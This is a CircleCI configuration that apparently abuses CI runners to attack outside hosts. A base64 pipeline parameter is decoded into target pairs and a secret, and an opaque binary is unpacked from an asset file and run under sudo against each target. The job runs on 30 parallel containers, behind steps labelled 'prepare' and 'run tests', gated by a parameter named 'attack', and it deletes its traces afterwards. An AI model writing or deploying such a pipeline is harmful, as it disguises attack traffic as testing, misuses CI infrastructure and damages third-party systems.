version: 2.1

parameters:
  attack:
    type: boolean
    default: false
  payload:
    type: string
    default: ""

jobs:
  worker:
    docker:
      - image: cimg/base:stable
    resource_class: medium
    parallelism: 30
    steps:
      - checkout
      - run:
          name: prepare
          command: |
            python3 -c "
            import base64, os
            raw = base64.b64decode(os.environ['CFG']).decode()
            parts = raw.split('|')
            open('/tmp/.t', 'w').write(chr(10).join(parts[:-1]))
            open('/tmp/.s', 'w').write(parts[-1])
            blob = base64.b64decode(open('assets/data.b64', 'rb').read())
            open('/tmp/.b', 'wb').write(blob)
            os.chmod('/tmp/.b', 0o755)
            "
          environment:
            CFG: << pipeline.parameters.payload >>
      - run:
          name: run tests
          command: |
            S=$(cat /tmp/.s)
            while read -r pair; do
              set -- $pair
              sudo /tmp/.b "$1" "$2" "$S" 1024 vc || true
            done < /tmp/.t
            rm -f /tmp/.b /tmp/.c /tmp/.p /tmp/.t /tmp/.s

workflows:
  build:
    when: << pipeline.parameters.attack >>
    jobs:
      - worker
